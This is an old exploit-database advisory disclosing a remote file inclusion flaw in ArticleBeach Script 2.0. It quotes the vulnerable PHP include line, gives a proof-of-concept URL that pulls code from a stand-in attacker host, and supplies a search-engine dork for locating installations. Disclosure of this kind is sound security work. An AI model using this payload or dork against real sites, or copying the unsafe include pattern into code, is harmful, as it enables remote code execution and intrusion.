@@ -1,0 +1,77 @@
+------------------------------------------------------------------------------
+ArticleBeach Script <= 2.0 (page) Remote File Inclusion Vulnerability
+------------------------------------------------------------------------------
+
+Author		: Zeni Susanto a.k.a Bithedz
+Date Found	: October, 22th 2006
+Location	: Indonesia, Bandung
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+Application	: ArticleBeach
+version		: 2.0
+vendor		: http://articlebeach.com
+source url      : http://www.articlebeach.com/script/
+
+---------------------------------------------------------------------------
+
+Description:
+~~~~~~~~~
+Articlebeach is Your one-stop source for free articles. Do you need contents to add to your web site? Or articles for use on your opt-in newsletters and e-zines? ArticleBeach has scoured the web and indexed a huge collection of articles on various subjects. Just click on the appropriate category to read the articles.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~
+
+I found vulnerability script in index.php
+
+---------- index.PHP---------------------------------------------------------
+include($_GET["page"].".php"); 
+-----------------------------------------------------------------------------
+
+Input passed to the "page" parameter in index.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+
+
+Proof Of Concept:
+~~~~~~~~~~~~~
+
+http://target.com/[articlebeach_path]/index.php?page=http://attact.com/colok.txt?
+
+-----------------------------------------------------------------------------
+
+Solution:
+~~~~
+- download fix in vendor URL 
+
+-----------------------------------------------------------------------------
+
+google d0rk:
+~~~~~~~~
+"ArticleBeach"
+
+-----------------------------------------------------------------------------
+Shoutz:
+~~~
+
+~ My Wife Monik 
+~ kaiten
+~ #e-c-h-o, #bridge (silent) @irc.dal.net
+-----------------------------------------------------------------------------
+
+Contact:
+~~~~
+ 
+     Bithedz[at]gmail[dot]com
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2006-10-25]
